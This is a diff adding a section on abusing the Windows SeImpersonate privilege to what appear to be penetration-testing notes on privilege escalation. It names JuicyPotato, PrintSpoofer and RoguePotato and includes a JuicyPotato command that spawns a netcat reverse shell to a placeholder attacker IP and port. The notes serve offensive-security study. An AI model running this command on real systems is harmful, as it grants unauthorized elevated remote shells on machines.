@@ -66,3 +66,14 @@ Named pipes can be viewed using `pipelist.exe /accepteula` or `gci \\.\pipe\` (*
 
 We can check the DACLs for the pipes using `.\accesschk.exe /accepteula [pipe] -v` (*we can check all pipes for write with `accesschk.exe -w \pipe\* -v`*).
 
+## Windows Privileges
+### SeImpersonate
+This allows us to run a process using another user's token. It can be very useful for escalating privileges.
+
+> This [paper](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) has further details on token impersonation attacks.
+
+Tools like [JuicyPotato](https://github.com/ohpe/juicy-potato) can be very helpful for exploiting this privilege and allows us to take control of other users via impersonation.
+```batch
+C:\JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c c:\nc.exe [atk_ip] [atk_port] -e cmd.exe" -t *
+```
+> JuicyPotato doesn't work past Windows Server 2019 or Windows 10 build 1809. However [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) do work by leveraging the same privileges.
